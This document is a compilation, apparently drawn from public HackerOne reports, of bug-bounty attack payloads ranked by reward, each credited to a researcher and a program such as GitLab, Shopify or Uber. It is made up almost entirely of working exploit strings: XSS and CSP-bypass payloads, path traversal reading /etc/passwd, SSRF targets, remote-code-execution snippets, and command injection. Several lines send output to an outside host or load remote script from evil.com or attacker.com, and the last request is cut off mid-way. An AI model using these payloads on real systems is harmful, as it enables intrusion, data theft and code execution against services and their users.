# Top payloads by bounty

### `e6246d42`

```
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```

— [Arbitrary file read via the UploadsRewriter when moving and issue](https://hackerone.com/reports/827052) · GitLab · [vakzz](https://hackerone.com/vakzz) · $20,000.0

### `561ce09c`

```
puts "hello from ruby"
`echo vakzz was here > /tmp/vakzz`
```

— [RCE via unsafe inline Kramdown options when rendering certain Wiki pages](https://hackerone.com/reports/1125425) · GitLab · [vakzz](https://hackerone.com/vakzz) · $20,000.0

### `3b5be6ed`

```
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre>
<base href=https://target.com>
<pre x=&#34;">
<code></code></pre>
```

— [Stored XSS in Notes (with CSP bypass for target.com)](https://hackerone.com/reports/1481207) · GitLab · [joaxcar](https://hackerone.com/joaxcar) · $13,950.0

### `bda19453`

```
{
   "id": "<img src=# height=10000 width=10000>",
   "url": "javascript:alert(document.domain)"
}
```

— [XSS in ZenTao integration affecting self hosted instances without strict CSP](https://hackerone.com/reports/1542510) · GitLab · [joaxcar](https://hackerone.com/joaxcar) · $13,950.0

### `d18883ea`

```
<a><pre lang='f/" onerror=alert(1) onload=alert(1) '><code lang="wavedrom">xss</code></pre></a>
```

— [Stored XSS via Kroki diagram](https://hackerone.com/reports/1731349) · GitLab · [vakzz](https://hackerone.com/vakzz) · $13,950.0

### `103da412`

```
{"html":"<script>alert(document.domain)</script>"}
```

— [Stored XSS via Kroki diagram](https://hackerone.com/reports/1731349) · GitLab · [vakzz](https://hackerone.com/vakzz) · $13,950.0

### `319e5d79`

```
http://metadata.google.internal/
```

— [SSRF on project import via the remote_attachment_url on a Note](https://hackerone.com/reports/826361) · GitLab · [vakzz](https://hackerone.com/vakzz) · $10,000.0

### `f958660f`

```
http://localhost:9090/api/v1/targets
```

— [SSRF on project import via the remote_attachment_url on a Note](https://hackerone.com/reports/826361) · GitLab · [vakzz](https://hackerone.com/vakzz) · $10,000.0

### `4063eda0`

```
whoami | curl https://target.com/ -d@-
```

— [Remote Code Execution on Cloud via latest Kibana 7.6.2](https://hackerone.com/reports/852613) · Elastic · [alexbrasetvik](https://hackerone.com/alexbrasetvik) · $10,000.0

### `ec7d25ed`

```
{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}
```

— [Stored XSS in target.com](https://hackerone.com/reports/131450) · Uber · [albinowax](https://hackerone.com/albinowax) · $7,500.0

### `7b91e8c4`

```
live_reload ${attacker_server}/..\\..\\traversal_poc.dll
```

— [Mozilla VPN Clients: RCE via file write and path traversal](https://hackerone.com/reports/2995025) · Mozilla · [trein](https://hackerone.com/trein) · $6,000.0

### `06a69864`

```
<svg onload="var req = new XMLHttpRequest(); req.open('GET', 'https://target.com/admin', false); req.setRequestHeader('Upgrade-Insecure-Requests', '1');req.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36') ;req.send(null);var headers = req.response.toLowerCase();console.log(headers);" xmlns="http://evil.com/2000/svg" xmlns:xlink="http://evil.com/1999/xlink" version=
```

— [Stored XSS in SVG file as data: url](https://hackerone.com/reports/1276742) · Shopify · [irisrumtub](https://hackerone.com/irisrumtub) · $5,300.0

### `cead62d3`

```
<http://\<img\ style=\"display:none\"\ src=0\ onerror=\"alert(\'Uh\ oh\')\"\>>
```

— [Vulnerability with the way \ escaped characters in <http://target.com> style links are rendered](https://hackerone.com/reports/46072) · HackerOne · [danlec](https://hackerone.com/danlec) · $5,000.0

### `cec0693f`

```
http://\<img\
```

— [Vulnerability with the way \ escaped characters in <http://target.com> style links are rendered](https://hackerone.com/reports/46072) · HackerOne · [danlec](https://hackerone.com/danlec) · $5,000.0

### `e7096fb2`

```
$.ajax({ 
  url: "https://target.com/reports/bulk", 
  method: 'post', 
  contentType: "application/json", 
  data: JSON.stringify({ 
    state: "open", 
    substate: "triaged", 
    report_ids: [… id of the report …], 
    reply_action: "change-state", 
    reference: {
      _isReactElement: true,
      _store: {},
      type:"body",
      props: {
        dangerouslySetInnerHTML: {
          __html:
            "<h1>Arbitrary HTML</h1><script>alert('No CSP Support :(')</script>"
        }
```

**Parameter:** `reference`
— [Improperly validated fields allows injection of arbitrary HTML via spoofed React objects](https://hackerone.com/reports/49652) · HackerOne · [danlec](https://hackerone.com/danlec) · $5,000.0

### `94f007ff`

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE svg [
    <!ENTITY elem "">
]>
<svg onload="alert(document.domain);" height="16" width="16">
  &elem;
</svg>
```

— [XSS on $shop$.target.com/admin/ and evil.com via whitelist bypass in SVG icon for sales channel applications](https://hackerone.com/reports/232174) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $5,000.0

### `6ae93660`

```
localhost:6725
```

— [\[Kafka Connect\] \[JdbcSinkConnector\]\[HttpSinkConnector\] RCE by leveraging file upload via SQLite JDBC driver and SSRF to internal Jolokia](https://hackerone.com/reports/1547877) · Aiven Ltd · [jarij](https://hackerone.com/jarij) · $5,000.0

### `da53a062`

```
{"id":"6243efcbc61d","variables":{"subredditName":"any-subreddit",
"after":"code-from-endCursor"
}}
```

**Parameter:** `after`
— [Getting access of mod logs from any public or restricted subreddit with IDOR vulnerability](https://hackerone.com/reports/1658418) · Reddit · [high_ping_ninja](https://hackerone.com/high_ping_ninja) · $5,000.0

### `dcc52215`

```
https://target.com/?dest=javascript:alert(document.domain)
```

**Parameter:** `dest`
— [\[target.com\] Redirect parameter allows for XSS](https://hackerone.com/reports/1962645) · Reddit · [dvorakxl](https://hackerone.com/dvorakxl) · $5,000.0

### `6bcce4f8`

```
POST /api/shopify/██████?operation=BillingDocumentDownload&type=mutation HTTP/2
Host: target.com
Cookie: ██████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-Shopify-Web-Force-Proxy: 1
X-Csrf-Token: ████
Caller-Pathname: /store/█████████/access_account/invoice/██████
Content-Length: 433
Origin: https://target.com
S
```

**Parameter:** `id`
— [IDOR on GraphQL queries BillingDocumentDownload and BillDetails](https://hackerone.com/reports/2207248) · Shopify · [blaklis](https://hackerone.com/blaklis) · $5,000.0

### `86ed6b35`

```
<!doctype html>
<html>
  <body>
    <form action="/upload" method="post" enctype="multipart/form-data">
      <input
        type="file"
        name="upload"
        value="calc.exe"
        accept="./../../../../Roaming/Microsoft/Windows/Start Menu/Programs/Startup/burp_calc.bat">
      <button type="submit">Upload</button>
    </form>
  </body>
</html>
```

— [Burp Suite Professional: browser-powered crawl can write attacker-controlled files through file input handling](https://hackerone.com/reports/3712279) · PortSwigger Web Security · [kawakatz](https://hackerone.com/kawakatz) · $5,000.0

### `d043126a`

```
"notes": [
        {
          "id": 1,
          "note": "interesting note here",
          "note_html": "<img src=\"test\" onerror=\"alert(document.domain)\"></img>html overwritten",
          "cached_markdown_version": 917504,
```

**Parameter:** `note_html`
— [Persistent XSS in Note objects](https://hackerone.com/reports/508184) · GitLab · [saltyyolk](https://hackerone.com/saltyyolk) · $4,500.0

### `a6dce1ba`

```
<form>any <b>html</b> can go <button>here<a data-remote="true" data-method="get" data-type="script" href="https://target.com/-/snippets/1999974/raw" class="atwho-view select2-drop-mask pika-select">
  <img width="10000" height="10000">
</a></button></form>
```

— [SafeParamsHelper::safe_params is not so safe](https://hackerone.com/reports/946728) · GitLab · [vakzz](https://hackerone.com/vakzz) · $4,000.0

### `49f013a0`

```
https://target.com/vakzz-h1/redirect1/-/issues?script_name=javascript:alert(1
```

**Parameter:** `script_name`
— [SafeParamsHelper::safe_params is not so safe](https://hackerone.com/reports/946728) · GitLab · [vakzz](https://hackerone.com/vakzz) · $4,000.0

### `b338cc38`

```
10.0.0.0/8
```

— [TURN server allows TCP and UDP proxying to internal network, localhost and meta-data services](https://hackerone.com/reports/333419) · Slack · [sandrogauci](https://hackerone.com/sandrogauci) · $3,500.0

### `976df397`

```
<div class="md md-file">
  <p>Full Page link</p>
  <p><a href="a" rel="nofollow"></a><a href="https://target.com/users/signin" class="atwho-view select2-drop-mask pika-select" rel="nofollow"><img height="10000" width="10000"></a></p>
</div>
```

— [Cross-site Scripting (XSS) - Stored in RDoc wiki pages](https://hackerone.com/reports/662287) · GitLab · [vakzz](https://hackerone.com/vakzz) · $3,500.0

### `3558f1b5`

```
a form
{
<div class="modal show d-block">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<h3 class="page-title">Please Log In</h3>
</div>
<div class="modal-body">
<form class="new-wiki-page" action="http://target.com/">
<div class="form-group">
<label for="username"><span>Username</span></label>
<input type="text" name="username" id="username" class="form-control">
<label for="password"><span>Password</span></label>
<input type="password" name="password" id="passwor
```

— [Cross-site Scripting (XSS) - Stored in RDoc wiki pages](https://hackerone.com/reports/662287) · GitLab · [vakzz](https://hackerone.com/vakzz) · $3,500.0

### `34af673c`

```
{<img src>}[link]
```

— [Cross-site Scripting (XSS) - Stored in RDoc wiki pages](https://hackerone.com/reports/662287) · GitLab · [vakzz](https://hackerone.com/vakzz) · $3,500.0

### `0b4586bc`

```
touch 1.txt
    git add 1.txt
    git commit -m "initial commit"
    git push origin master
    
    git checkout -b "<img/src='x'/onerror=alert(document.domain)>"
    touch 2.txt
    git add 2.txt
    git commit -m "add 2.txt"
    git push origin "<img/src='x'/onerror=alert(document.domain)>"
    
    git checkout master
    touch 3.txt
    git add 3.txt
    git commit -m "add 3.txt"
    git push origin master
```

**Parameter:** `branch_name`
— [Stored XSS in merge request pages](https://hackerone.com/reports/723307) · GitLab · [mike12](https://hackerone.com/mike12) · $3,500.0

### `c3bef5a5`

```
<img/src='x'/onerror=alert(document.domain)>
```

**Parameter:** `branch_name`
— [Stored XSS in merge request pages](https://hackerone.com/reports/723307) · GitLab · [mike12](https://hackerone.com/mike12) · $3,500.0

### `1a584a69`

```
$ node --experimental-permission \
        --allow-fs-read=/tmp/ \
        -p 'fs.readFileSync(new TextEncoder().encode("/tmp/../etc/passwd"))'
<Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 6e 6f 62 6f 64 79 3a 78 3a 36 35 35 33 34 3a 36 35 35 33 34 3a 4e ... 2103 more bytes>
```

— [Path traversal through path stored in Uint8Array in Node.js 20](https://hackerone.com/reports/2256167) · Internet Bug Bounty · [tniessen](https://hackerone.com/tniessen) · $3,495.0

### `119ac9d7`

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="referrer" content="none">
    <meta name="referrer" content="no-referrer">
</head>
<body>
      <form action="https://target.com/api/graphql/" id="csrf-form" method="GET">
        <input name="query" value="mutation CreateSnippet($input: CreateSnippetInput!) {  createSnippet(input: $
```

— [CSRF on /api/graphql allows executing mutations through GET requests](https://hackerone.com/reports/1122408) · GitLab · [az3z3l](https://hackerone.com/az3z3l) · $3,370.0

### `e21e9381`

```
https://target.com/docs/deep-linking?q=wrtz{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}zzzz
```

**Parameter:** `q`
— [Reflected XSS on target.com via Angular template injection](https://hackerone.com/reports/125027) · Uber · [albinowax](https://hackerone.com/albinowax) · $3,000.0

### `2279737e`

```
https://target.com/en//example.com/
```

— [Reflected XSS via Unvalidated / Open Redirect in target.com](https://hackerone.com/reports/125791) · Uber · [mdv](https://hackerone.com/mdv) · $3,000.0

### `10edb466`

```
let shop = prompt("Enter a Target Shop URL:", "https://target.com");
let frame = document.createElement("iframe");
frame.src = `${shop}/1337/digital_wallets/dialog`;
frame.style.display = "none";
frame.onload = () => {
  frame.contentWindow.postMessage({
    type: "DigitalWalletsDialog:change",
    digitalWalletsDialog: true,
    payload: {
      title: "placeholder",
      button: "placeholder",
      lineItems: [new File([""], "<img src=xx: onerror=alert(documen
```

— [XSS on any Shopify shop via abuse of the HTML5 structured clone algorithm in postMessage listener on "/:id/digital_wallets/dialog"](https://hackerone.com/reports/231053) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $3,000.0

### `3406da01`

```
<svg><!--?php "--><script>confirm(20)</script>?&gt;</svg>
```

— [Bypass Filter and get Stored Xss ](https://hackerone.com/reports/299424) · Shopify · [dr_dragon](https://hackerone.com/dr_dragon) · $3,000.0

### `d7019d11`

```
deploy:
      stage: deploy
      script:
        - echo "Example"
      environment:
        name: production
        url: https://target.com
        kubernetes:
          namespace: <img src=x onerror=alert(1)>
      only:
      - master
```

**Parameter:** `namespace`
— [Stored XSS on the job page](https://hackerone.com/reports/856554) · GitLab · [mike12](https://hackerone.com/mike12) · $3,000.0

### `1963b9bf`

```
requires_python='"><script>alert(1)</script>'
```

**Parameter:** `requires_python`
— [Stored XSS on PyPi simple API endpoint](https://hackerone.com/reports/856836) · GitLab · [vakzz](https://hackerone.com/vakzz) · $3,000.0

### `d879f4ee`

```
%%{init: { 'fontFamily': '\"></style><img src=x onerror=alert(document.cookie)>'} }%%
```

— [Stored DOM XSS via Mermaid chart](https://hackerone.com/reports/1103258) · GitLab · [taraszelyk](https://hackerone.com/taraszelyk) · $3,000.0

### `1ec47fbf`

```
%%{init: { 'fontFamily': '\"></style><img src=x onerror=alert(document.cookie)>'} }%%
sequenceDiagram
Alice->>Bob: Hi Bob
Bob->>Alice: Hi Alice
```

— [Stored DOM XSS via Mermaid chart](https://hackerone.com/reports/1103258) · GitLab · [taraszelyk](https://hackerone.com/taraszelyk) · $3,000.0

### `8db799b3`

```
mutation {
  createCustomEmoji(input: 
    {
      groupPath: "xss_target", 
      name:"xssreplace",
      url:"http://aaa#'><img onerror=alert(location) src=.>"
    }) {
    customEmoji {
      id
      name
      url
    }
  }
}
```

**Parameter:** `url`
— [Stored XSS in custom emoji](https://hackerone.com/reports/1198517) · GitLab · [ooooooo_q](https://hackerone.com/ooooooo_q) · $3,000.0

### `9b2ce555`

```
<pre data-sourcepos="&#34; href=&#34;x&#34;></pre>
<gl-emoji data-name='&#34;x=&#34y&#34 onload=&#34;alert(document.location.href)&#34;' data-unicode-version='x'>
abc
</gl-emoji>
<pre x=&#34;">
<code></code></pre>
```

— [Stored XSS on issue comments and other pages which contain notes](https://hackerone.com/reports/1398305) · GitLab · [jarij](https://hackerone.com/jarij) · $3,000.0

### `e327613f`

```
<lua>
_,execute = pcall(loadstring,
    [[
        local command = ...;
        local handle = io.popen(command)
        local result = handle:read("*a")
        handle:close()
        return result;
    ]]
);

print(execute('id'));
execute('echo vakzz > /tmp/ggg');
</lua>
```

— [RCE via WikiCloth markdown rendering if the `rubyluabridge` gem is installed](https://hackerone.com/reports/1401444) · GitLab · [vakzz](https://hackerone.com/vakzz) · $3,000.0

### `32716436`

```
payload i use = "><img src=x onerror=prompt(123)>
```

— [Stored XSS in "Create Groups"](https://hackerone.com/reports/647130) · GitLab · [rioncool22](https://hackerone.com/rioncool22) · $2,500.0

### `20c5dd08`

```
curl localhost/z/ -H "host: x.x" -H 'x-ginoah: content_by_lua_block {ngx.req.read_body();local post_args = ngx.req.get_post_args();local cmd = post_args["cmd"];if cmd then f_ret = io.popen(cmd);local ret = f_ret:read("*a");ngx.say(string.format("%s", ret));end;}'
```

— [RCE  on ingress-nginx-controller via Ingress spec.rules.http.paths.path field](https://hackerone.com/reports/1620702) · Kubernetes · [ginoah](https://hackerone.com/ginoah) · $2,500.0

### `221ddd04`

```
cat > su.yml<<EOF
apiVersion: target.com/v1
kind: Ingress
metadata:
  name: ingress-exploit
  annotations:
    evil.com/ingress.class: "nginx"
    evil2.com/configuration-snippet: |
      more_set_headers "suanve"
            proxy_pass http://upstream_balancer;
                                proxy_redirect                          off;
        }
        location /suanve/ { content_by_lua_block { local rsfile = io.popen(ngx.req.get_headers()["cmd"]);local rschar = 
```

— [Ingress nginx annotation injection causes arbitrary command execution](https://hackerone.com/reports/1728174) · Kubernetes · [suanve](https://hackerone.com/suanve) · $2,500.0

### `42c68f0e`

```
/exploit/etc/passwd
```

— [Path traversal by monkey-patching Buffer internals](https://hackerone.com/reports/2434811) · Internet Bug Bounty · [tniessen](https://hackerone.com/tniessen) · $2,430.0

### `604f8c66`

```
/tmp/../etc/passwd
```

— [Path traversal by monkey-patching Buffer internals](https://hackerone.com/reports/2434811) · Internet Bug Bounty · [tniessen](https://hackerone.com/tniessen) · $2,430.0

### `dba40ea4`

```
<select><style><script>alert(1)</script></style></select>
```

— [Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag](https://hackerone.com/reports/1599573) · Internet Bug Bounty · [windshock](https://hackerone.com/windshock) · $2,400.0

### `bc0a97fe`

```
<svg id='x' xmlns='http://target.com/2000/svg' xmlns:xlink='http://target.com/1999/xlink' width='1337' height='1337'>
<image href="1" onerror="alert(window.origin)" />
</svg>
```

— [Rails ActionView sanitize helper bypass leading to XSS using SVG tag.](https://hackerone.com/reports/1805873) · Internet Bug Bounty · [haqpl](https://hackerone.com/haqpl) · $2,400.0

### `f0da5cb0`

```
$ node --experimental-permission --allow-fs-read=/tmp/ -p "path.resolve = (s) => s; fs.readFileSync('/tmp/../etc/passwd')"
<Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 64 61 65 6d 6f 6e 3a 78 3a 31 3a 31 3a 64 61 65 6d 6f ... 3174 more bytes>
```

— [Permission model improperly protects against path traversal in Node.js 20](https://hackerone.com/reports/2225660) · Internet Bug Bounty · [tniessen](https://hackerone.com/tniessen) · $2,330.0

### `6b9a7472`

```
<form method="POST" action="https://target.com/danlec-test/team_members"
     target="_blank">
  <input type="text" name="authenticity_token" 
     value="authenticity_token from the POST to this page">
  <input type="text" name="invitations_team_member[email]" 
     value="attacker@gmail.com">
  <input type="hidden" name="team_member[add_as_manager]" value="1">
  <input type="hidden" name="utf8" value="✓">
  <input type="hidden" name="commit" value="Send invite">
  <input type="submit">
</fo
```

— [CSP Bypass: Click handler for links with data-method="post" can cause authenticity_token to be sent off domain](https://hackerone.com/reports/47472) · HackerOne · [danlec](https://hackerone.com/danlec) · $2,000.0

### `6cd52ba3`

```
{
  "status": "ok",
  "code": 200,
  "data": {
    "content": [
      {
        "source": 0,
        "collectionId": "131560603",
        "content": {
          "generator": {
            "id": "target.com"
          },
          "bodyHtml": "<marquee>XSS</marquee><script>alert(\"XSS on \"+ document.domain)</script>",
          "annotations": {
            "likedBy": [
              "54c1e33eb841b37995000d5d@engadget.evil.com"
            ]
          },
          "authorId": "50782a81bc6bf341d3
```

**Parameter:** `bodyHtml`
— [Reflected XSS via Livefyre Media Wall in target.com](https://hackerone.com/reports/134061) · Uber · [mdv](https://hackerone.com/mdv) · $2,000.0

### `2e48c925`

```
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
```

— [Tinymce 2.4.0](https://hackerone.com/reports/262230) · Shopify · [jelmer](https://hackerone.com/jelmer) · $2,000.0

### `5ebeda7b`

```
<HTML xmlns: ><audio>
<audio src=wp onerror=alert(0X1)>
```

— [Tinymce 2.4.0](https://hackerone.com/reports/262230) · Shopify · [jelmer](https://hackerone.com/jelmer) · $2,000.0

### `0c236890`

```
a:
  script:
  - ls -lashR
  cache:
    key: ../1/cache
    policy: pull
    paths:
      - .
```

**Parameter:** `key`
— [GitLab CI runner can read and poison cache of all other projects](https://hackerone.com/reports/301432) · GitLab · [jobert](https://hackerone.com/jobert) · $2,000.0

### `0f41a4a5`

```
a:
  script:
  - echo 1 > file-to-poison
  cache:
    key: ../1/cache
    policy: push
    paths:
      - file-to-poison
```

**Parameter:** `key`
— [GitLab CI runner can read and poison cache of all other projects](https://hackerone.com/reports/301432) · GitLab · [jobert](https://hackerone.com/jobert) · $2,000.0

### `f68ae39d`

```
4- So change the any member name with hunter"><svg/onload=alert(2)>
```

**Parameter:** `member_name`
— [Stored XSS on activity](https://hackerone.com/reports/391390) · Shopify · [shazadsadiq](https://hackerone.com/shazadsadiq) · $2,000.0

### `4ba618a5`

```
/etc/passwd
```

— [Worker container escape lead to arbitrary file reading in host machine](https://hackerone.com/reports/694181) · Semmle · [testanull](https://hackerone.com/testanull) · $2,000.0

### `a9ca77c6`

```
- rm -rf /opt/out/snapshot/log/build.log && ln -s /etc/passwd /opt/out/snapshot/log/build.log
```

— [Worker container escape lead to arbitrary file reading in host machine](https://hackerone.com/reports/694181) · Semmle · [testanull](https://hackerone.com/testanull) · $2,000.0

### `bcd905a3`

```
https://target.com/?contact[email]%20onfocus%3djavascript:alert(%27xss%27)%20autofocus%20a=a&form_type[a]aaa
```

**Parameter:** `contact[email]`
— [Reflective Cross-site Scripting via Newsletter Form](https://hackerone.com/reports/709336) · Shopify · [gam817](https://hackerone.com/gam817) · $2,000.0

### `d1bfb0e1`

```
{
"url":"javascript://test%0aalert(document.domain)"
}
```

— [Stored XSS in Elastic App Search](https://hackerone.com/reports/846905) · Elastic · [iamnoooob](https://hackerone.com/iamnoooob) · $2,000.0

### `6ab023d8`

```
foo style=animation-name:gl-spinner-rotate onanimationend=alert(1)
```

**Parameter:** `full_name`
— [Stored XSS in group issue list](https://hackerone.com/reports/859333) · GitLab · [mike12](https://hackerone.com/mike12) · $2,000.0

### `aeda56bd`

```
package ; whoami
```

— [POOL_UPGRADE request handler may allow an unauthenticated attacker to remotely execute code on every node in the network. ](https://hackerone.com/reports/1705717) · Linux Foundation Decentralized Trust · [shakedreiner](https://hackerone.com/shakedreiner) · $2,000.0

### `bc678d52`

```
javascript://%0aalert(1)
```

— [Possible XSS vulnerability without a content security bypass](https://hackerone.com/reports/1804177) · Stripe · [saajanbhujel](https://hackerone.com/saajanbhujel) · $2,000.0

### `af17d738`

```
<Button href="javascript://%0aalert(document.domain)">XSS</Button>
```

— [XSS vulnerability without a content security bypass in a `CUSTOM` App through Button tag](https://hackerone.com/reports/1823216) · Stripe · [saajanbhujel](https://hackerone.com/saajanbhujel) · $2,000.0

### `8b7bb862`

```
redirect_uri=https%3A%2F%2Ftarget.com%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/4503924
```

**Parameter:** `redirect_uri`
— [Stealing Users OAuth authorization code via redirect_uri](https://hackerone.com/reports/1861974) · pixiv · [kuzu7shiki](https://hackerone.com/kuzu7shiki) · $2,000.0

### `291ac753`

```
https://target.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31&google_apps_uri=javascript:prompt(document.domain
```

**Parameter:** `google_apps_uri`
— [XSS while logging using Google](https://hackerone.com/reports/691611) · Shopify · [ashketchum](https://hackerone.com/ashketchum) · $1,750.0

### `e871d0b0`

```
https://target.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31&google_apps_uri=javascript:prompt(document.cookie
```

**Parameter:** `google_apps_uri`
— [XSS while logging using Google](https://hackerone.com/reports/691611) · Shopify · [ashketchum](https://hackerone.com/ashketchum) · $1,750.0

### `683db35e`

```
ga("create", {
	"name": "pwn",
	"trackingId": "UA-44361710-4",
	"cookieName": "injectedCookie=value;"
})
// [snip]
document.cookie = "injectedCookie=value;=GA1.3.614842418.1609270420; path=/; expires=Thu, 19 Jan 2023 03:18:11 GMT; domain=target.com;"
```

**Parameter:** `cookieName`
— [\[redacted\]](https://hackerone.com/reports/1081167) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $1,600.0

### `7792093d`

```
> <img src=x onerror=prompt(document.domain)>
```

**Parameter:** `description`
— [\[h1-2102\] Stored XSS in product description via `productUpdate` GraphQL query leads to XSS at target.com/products/\[ID\]](https://hackerone.com/reports/1085546) · Shopify · [intidc](https://hackerone.com/intidc) · $1,600.0

### `08394dce`

```
<object type="text/x-scriptlet" data="https://target.com/scriptlet.html"></object>
```

**Parameter:** `last_name`
— [Stored XSS in Dovetale by application of creator](https://hackerone.com/reports/1652046) · Shopify · [kun_19](https://hackerone.com/kun_19) · $1,600.0

### `acfdbb03`

```
https://target.com/creator/auth/login?creator_redirect=javascript:alert(document.domain)
```

**Parameter:** `creator_redirect`
— [Cross-site scripting on target.com](https://hackerone.com/reports/1672459) · Shopify · [kun_19](https://hackerone.com/kun_19) · $1,600.0

### `a6cc20f6`

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shopify Search Form</title>
</head>
<body>
    Please hold...
    
    <form id="post-form" action="https://target.com/en/search?_data=routes%2F%28%24locale%29.search" method="POST">
        <input type="hidden" name="query" value="Is this XSS?">
        <input type="hidden" name="greeting" value="![Mouse wheel click here for more info...]
```

**Parameter:** `greeting`
— [Reflected XSS in AI Chat Bot Greetings at target.com via Markdown Image Rendering](https://hackerone.com/reports/2509022) · Shopify · [saltymermaid](https://hackerone.com/saltymermaid) · $1,600.0

### `0422387e`

```
https://target.com/login?next=https://evil.com.
```

**Parameter:** `next`
— [XSS and Open Redirect on MoPub Login](https://hackerone.com/reports/683298) · X / xAI · [jackb898](https://hackerone.com/jackb898) · $1,540.0

### `801a80dd`

```
https://target.com/login?next=https://evil.com
```

**Parameter:** `next`
— [XSS and Open Redirect on MoPub Login](https://hackerone.com/reports/683298) · X / xAI · [jackb898](https://hackerone.com/jackb898) · $1,540.0

### `13460e9a`

```
YUI.namespace('Env.DATA').consumer = {"uuid":"</script><script src=//target.com/z0i2sU>","firstName":null,
```

**Parameter:** `uuid`
— [Ability to create own account UUID leads to stored XSS](https://hackerone.com/reports/249131) · Upserve  · [cache-money](https://hackerone.com/cache-money) · $1,500.0

### `15c1fdad`

```
cat poc.gem | curl -H 'Content-Type: application/gzip' --data-binary @- -H 'Authorization: █████' https://target.com/api/v1/gems
```

— [Remote code execution on target.com](https://hackerone.com/reports/274990) · RubyGems · [max](https://hackerone.com/max) · $1,500.0

### `b0b531ad`

```
url=JAVASCRIPT:some-payload
```

**Parameter:** `url`
— [Query parameter reordering causes redirect page to render unsafe URL](https://hackerone.com/reports/293689) · HackerOne · [kenziy](https://hackerone.com/kenziy) · $1,500.0

### `9b94ac19`

```
<!DOCTYPE svg [
<!ENTITY % outside SYSTEM "http://attacker.com/exfil.dtd">
%outside;
]>
<svg>
  <defs>
    <pattern id="exploit">
      <text x="10" y="10">
        &exfil;
      </text>
    </pattern>
  </defs>
</svg>
```

— [LFI and SSRF via XXE in emblem editor](https://hackerone.com/reports/347139) · Rockstar Games · [alexbirsan](https://hackerone.com/alexbirsan) · $1,500.0

### `3c76be40`

```
<text x="10" y="10">
    <xi:include href="https://target.com/" parse="text"/>
</text>
```

— [LFI and SSRF via XXE in emblem editor](https://hackerone.com/reports/347139) · Rockstar Games · [alexbirsan](https://hackerone.com/alexbirsan) · $1,500.0

### `acc40d79`

```
1-Go to             >.target.com/admin/authenticate?return_url=javascript:alert(100)//
```

**Parameter:** `return_url`
— [Reflected XSS on $Any$.target.com/admin](https://hackerone.com/reports/422707) · Shopify · [dr_dragon](https://hackerone.com/dr_dragon) · $1,500.0

### `65486647`

```
<script src='https://target.com/recaptcha/about/js/main.min.js'></script>
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
```

— [CSP bypass on target.com using Google script resources](https://hackerone.com/reports/2279346) · PortSwigger Web Security · [joaxcar](https://hackerone.com/joaxcar) · $1,500.0

### `5bbd0c2f`

```
<img src=x ng-on-error='
w=$event.target.ownerDocument;
a=w.defaultView.top.document.querySelector("[nonce]");
b=w.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce;
w.body.appendChild(b)
'>
```

— [CSP bypass on target.com using Google script resources](https://hackerone.com/reports/2279346) · PortSwigger Web Security · [joaxcar](https://hackerone.com/joaxcar) · $1,500.0

### `e330922e`

```
document.getElementsByTagName("div")[0].innerHTML=`<iframe srcdoc="<div lang=en ng-app=application ng-csp class=ng-scope>
<script src='https://target.com/recaptcha/about/js/main.min.js'></script>
<img src=x ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector(&quot;[nonce]&quot;);b=w.createElement(&quot;script&quot;);b.src=&quot;//evil.com/hack.js&quot;;b.nonce=a.nonce;w.body.appendChild(b)'>
</div>
">`
```

— [CSP bypass on target.com using Google script resources](https://hackerone.com/reports/2279346) · PortSwigger Web Security · [joaxcar](https://hackerone.com/joaxcar) · $1,500.0

### `250b2621`

```
POST /api/patchPaymentMethod/ID HTTP/2
…

{
  "ipAddress": "<svg on onload=(alert)(document.domain)>",
  "callBackURL": "dssdsd"
}
```

**Parameter:** `ipAddress`
— [Stored xss at https://█.target.com/api/█/ID](https://hackerone.com/reports/2078490) · 8x8 · [pentestor](https://hackerone.com/pentestor) · $1,337.0

### `040f314d`

```
<![endif]-- onerror="<![endif]-->" onload="<img src=1 onerror='alert(1)' />">
```

— [Email templates XSS by filterXSS bypass](https://hackerone.com/reports/1404804) · Judge.me  · [caue](https://hackerone.com/caue) · $1,250.0

### `1cf452c2`

```
POST /api/graphql HTTP/2
Host: target.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 1620
Origin: https://target.com
Cookie: <replace-here>
X-Csrf-Token: <replace-here>

